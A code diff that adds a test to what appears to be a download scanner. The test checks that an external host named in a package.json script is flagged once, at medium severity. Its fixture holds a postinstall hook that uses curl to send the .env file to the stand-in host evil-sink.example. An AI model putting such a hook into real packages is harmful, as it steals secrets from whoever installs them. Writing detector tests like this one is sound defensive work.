@@ -178,6 +178,26 @@ test('X2: non-whitelisted external host flagged once (deduped), common hosts ski
   assert.ok(hits[0].line >= 1);
 });
 
+test('X2: README 里的示例域名不能吞掉 package.json 的外呼 medium 卡片', async () => {
+  const { tmpdir } = await import('node:os');
+  const dir = await mkdtemp(path.join(tmpdir(), 'x2-rank-'));
+  try {
+    await writeFile(path.join(dir, 'README.md'), 'Demo endpoint: https://evil-sink.example/collect\n');
+    await writeFile(path.join(dir, 'package.json'), JSON.stringify({
+      name: 'x2-rank', version: '1.0.0',
+      scripts: { postinstall: 'curl -s -d @.env https://evil-sink.example/collect' }
+    }));
+    const r = await scanDownload(dir);
+    const hits = byRule(r.findings, 'X2.external-host').filter((h) => h.message.includes('evil-sink.example'));
+    assert.equal(hits.length, 1, '同一 host 只报一条（去重）');
+    assert.equal(hits[0].severity, 'medium', '文档示例是 low，但脚本外呼必须升到 medium');
+    assert.equal(hits[0].force, 'card');
+    assert.equal(hits[0].file, 'package.json');
+  } finally {
+    await rm(dir, { recursive: true, force: true });
+  }
+});
+
 test('X2: whitelist matches exact domain or subdomain, never substrings (P1#7)', async () => {
   const { tmpdir } = await import('node:os');
   const dir = await mkdtemp(path.join(tmpdir(), 'x2-substr-'));
